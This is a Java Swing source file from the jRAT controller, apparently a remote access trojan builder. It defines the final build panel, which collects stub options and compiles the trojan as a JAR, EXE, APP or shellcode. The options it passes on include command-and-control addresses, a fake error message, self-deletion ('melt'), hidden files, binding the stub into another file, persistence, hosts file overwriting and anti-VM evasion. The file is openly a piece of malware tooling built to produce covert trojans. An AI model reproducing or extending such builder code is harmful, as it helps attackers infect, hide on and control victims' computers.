package jrat.controller.ui.panels;

import iconlib.IconUtils;
import jrat.common.utils.DataUnits;
import jrat.controller.ErrorDialog;
import jrat.controller.Globals;
import jrat.controller.OSConfig;
import jrat.controller.ShellcodeGenerator;
import jrat.controller.addons.PluginList;
import jrat.controller.addons.StubPlugin;
import jrat.controller.build.Build;
import jrat.controller.build.BuildApp;
import jrat.controller.build.BuildExecutable;
import jrat.controller.build.BuildStatus;
import jrat.controller.listeners.AdvancedBuildListener;
import jrat.controller.settings.Settings;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.frames.FrameBuildAdvanced;
import jrat.controller.ui.renderers.table.BuildTableRenderer;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.LinkedHashMap;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import jrat.api.ui.DefaultJTable;


@SuppressWarnings("serial")
public class PanelBuildFinal extends JPanel {

	public FrameBuildAdvanced holder;
	private JTextField txtOutput;
	private JLabel lblExpectedSizeUnknown;
	private JProgressBar progressBar;
	private JLabel lblStatus;
	private PanelBuildFinal frame;
	private JButton btnBuild;
	private LinkedHashMap<String, BuildStatus> statuses = new LinkedHashMap<String, BuildStatus>();
	private JTable table;

	public TableModel getModel() {
		return (TableModel) table.getModel();
	}

	public LinkedHashMap<String, BuildStatus> getStatuses() {
		return statuses;
	}

	public void setStatus(String s, BuildStatus status) {
		lblStatus.setText(s);
	}

	public void setValue(int i) {
		progressBar.setValue(i);
		repaint();
	}

	public JLabel getStatusLabel() {
		return lblStatus;
	}

	public JButton getBuildButton() {
		return btnBuild;
	}

	public void log(String message, BuildStatus status) {
		try {
			statuses.put(message, status);
			((TableModel) table.getModel()).addRow(new Object[] { message });
			table.scrollRectToVisible(table.getCellRect(table.getRowCount(), 0, false));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public PanelBuildFinal(FrameBuildAdvanced frame) {

		holder = frame;
		this.frame = this;

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Finalize and build stub"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 426, GroupLayout.PREFERRED_SIZE).addContainerGap(14, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 273, GroupLayout.PREFERRED_SIZE).addContainerGap(16, Short.MAX_VALUE)));

		btnBuild = new JButton("Build");
		btnBuild.setIcon(IconUtils.getIcon("final"));
		btnBuild.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				perform();
			}
		});

		JLabel lblOutput = new JLabel("Output");

		txtOutput = new JTextField();
		txtOutput.setEditable(false);
		txtOutput.setColumns(10);

		JButton button = new JButton("");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser f = new JFileChooser();
				f.showSaveDialog(null);
				File file = f.getSelectedFile();
				if (file != null) {
					txtOutput.setText(file.getAbsolutePath());
				}
			}
		});
		button.setIcon(IconUtils.getIcon("folder"));

		lblExpectedSizeUnknown = new JLabel("Expected size: Unknown");

		JButton button_1 = new JButton("");
		button_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				formatLbl();
			}
		});
		button_1.setIcon(IconUtils.getIcon("refresh"));

		progressBar = new JProgressBar();

		lblStatus = new JLabel("Idle...");

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 394, Short.MAX_VALUE).addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup().addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnBuild, GroupLayout.PREFERRED_SIZE, 109, GroupLayout.PREFERRED_SIZE)).addGroup(gl_panel.createSequentialGroup().addComponent(lblOutput).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtOutput, GroupLayout.PREFERRED_SIZE, 262, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(button)).addGroup(gl_panel.createSequentialGroup().addComponent(lblExpectedSizeUnknown).addPreferredGap(ComponentPlacement.RELATED).addComponent(button_1)).addComponent(lblStatus)).addContainerGap()));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addGap(16).addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(lblOutput).addComponent(txtOutput, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addComponent(button)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addComponent(lblExpectedSizeUnknown, GroupLayout.DEFAULT_SIZE, 25, Short.MAX_VALUE).addComponent(button_1)).addPreferredGap(ComponentPlacement.RELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblStatus).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.LEADING, false).addComponent(progressBar, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(btnBuild, GroupLayout.DEFAULT_SIZE, 32, Short.MAX_VALUE)).addContainerGap()));

		table = new DefaultJTable();
		table.setModel(new TableModel(new Object[][] {}, new String[] { "New column" }));
		table.setTableHeader(null);
		table.setRowHeight(25);
		table.setDefaultRenderer(Object.class, new BuildTableRenderer(getStatuses()));
		scrollPane.setViewportView(table);
		panel.setLayout(gl_panel);
		setLayout(groupLayout);

	}

	public void perform() {
		new Thread() {
			public void run() {
				try {
					PanelBuildBinder binder = (PanelBuildBinder) holder.panels.get("binder");
					PanelBuildGeneral general = (PanelBuildGeneral) holder.panels.get("general");
					PanelBuildInstallMessage message = (PanelBuildInstallMessage) holder.panels.get("install message");

					PanelBuildNetwork network = (PanelBuildNetwork) holder.panels.get("network");
					PanelBuildStartup startup = (PanelBuildStartup) holder.panels.get("startup");
					PanelBuildMutex mutex = (PanelBuildMutex) holder.panels.get("mutex");
					PanelBuildOS os = (PanelBuildOS) holder.panels.get("allowed os");
					PanelBuildPlugins pl = (PanelBuildPlugins) holder.panels.get("plugins");
					PanelBuildTimeout ti = (PanelBuildTimeout) holder.panels.get("timeout");
					PanelBuildDelay de = (PanelBuildDelay) holder.panels.get("delay");
					PanelBuildHostFile host = (PanelBuildHostFile) holder.panels.get("host file");
					PanelBuildVisibility vis = (PanelBuildVisibility) holder.panels.get("tray icon");
					PanelBuildError err = (PanelBuildError) holder.panels.get("error handling");
					PanelBuildPersistance per = (PanelBuildPersistance) holder.panels.get("persistance");
					PanelBuildDebugMessages pdebug = (PanelBuildDebugMessages) holder.panels.get("debug messages");
					PanelBuildOutput out = (PanelBuildOutput) holder.panels.get("output");
					PanelBuildVirtualization vm = (PanelBuildVirtualization) holder.panels.get("virtualization");

					String file = txtOutput.getText().trim();
					String[] addresses = network.getAddresses();
					String ID = general.getID();
					String pass = general.getPass();
					boolean dontInstall = startup.dontInstall();
					int droppath = startup.getDropLocation();
					int reconSec = network.getConnectionRate();
					String name = startup.getJarName();
					boolean fakewindow = message.shouldShowDialog();
					String faketitle = message.getTitle();
					String fakemessage = message.getMsg();
					int fakeicon = message.getIcon();
					boolean melt = startup.shouldMelt();
					boolean hiddenFile = startup.shouldHideFile();
					boolean runNextBoot = startup.shouldRunNextBoot();
					boolean bind = binder.shouldBind();
					String bindpath = binder.getFile();
					String bindname = binder.getFileName();
					int binddrop = binder.dropTarget();
					boolean usemutex = mutex.useMutex();
					int mutexport = mutex.mutexPort();
					PluginList plist = pl.getList();
					boolean timeout = ti.enabled();
					int timeoutms = ti.getSecondsAsMilli();
					boolean delay = de.useDelay();
					int delayms = de.getDelayAsSeconds();
					boolean usehost = host.isEnabled();
					String hosttext = host.getText();
					boolean overwritehost = host.overwrite();
					boolean trayicon = vis.useIcon();
					String icon = vis.getIcon();
					String traymsg = vis.getConnectMessage();
					String traymsgfail = vis.getDisconnectMessage();
					String traytitle = vis.getTitle();
					boolean handleerr = err.errorLogging();
					boolean persistance = per.isPersistanceEnabled();
					int persistancems = per.getMS();
					boolean debugmsg = pdebug.keepDebugMessages();
					OSConfig osconfig = os.getConfig();
					boolean antivm = vm.antiVm();

					if (file.length() == 0) {
						throw new IOException("Invalid output file");
					}

					if (out.useShellcode()) {
						File temp = File.createTempFile("jratbuild", ".jar");
						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);

						if (!file.endsWith(".jar")) {
							file = file + ".jar";
						}

						ShellcodeGenerator.generate(temp, new File(file), out.getShellcode(), "byteArray");
						temp.delete();
					} else if (out.useExe()) {
						File temp = File.createTempFile("jratbuild", ".jar");

						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);

						if (!file.toLowerCase().endsWith(".exe")) {
							file = file + ".exe";
						}

						BuildExecutable.build(temp.getAbsolutePath(), file, out.frameExecutableInfo);

						temp.delete();
					} else if (out.useApp()) {
						File temp = File.createTempFile("jratbuild", ".jar");

						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);

						if (!file.toLowerCase().endsWith(".app")) {
							file = file + ".app";
						}

						BuildApp.build(temp.getAbsolutePath(), file, out.frameAppInfo);

						temp.delete();
					} else {				
						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);		
					}

					Settings.getGlobal().set(Settings.KEY_HOSTS, network.getAddresses());

					Settings.getGlobal().set(Settings.KEY_RECONNECT_RATE, reconSec);
					Settings.getGlobal().set(Settings.KEY_INSTALLATION_NAME, name);
					Settings.getGlobal().set(Settings.KEY_BUILD_ID, ID);
					Settings.getGlobal().setBuildPassword(pass);
					Settings.getGlobal().save();
				} catch (Exception ex) {
					ErrorDialog.create(ex);
					ex.printStackTrace();
				}
			}
		}.start();
	}

	public void formatLbl() {
		PanelBuildBinder binder = (PanelBuildBinder) holder.panels.get("binder");
		PanelBuildPlugins plugins = (PanelBuildPlugins) holder.panels.get("plugins");

		int size = (int) Globals.getStub().length();

		if (binder.shouldBind()) {
			File bind = new File(binder.getFile());
			if (bind.exists()) {
				size += bind.length();
			}
		}

		PluginList list = plugins.getList();
		if (list != null) {
			for (StubPlugin p : list.plugins) {
				size += new File(p.path).length();
			}
		}

		this.lblExpectedSizeUnknown.setText("Expected size: " + DataUnits.getAsString(size));
	}

	public void clearRows() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
	}
}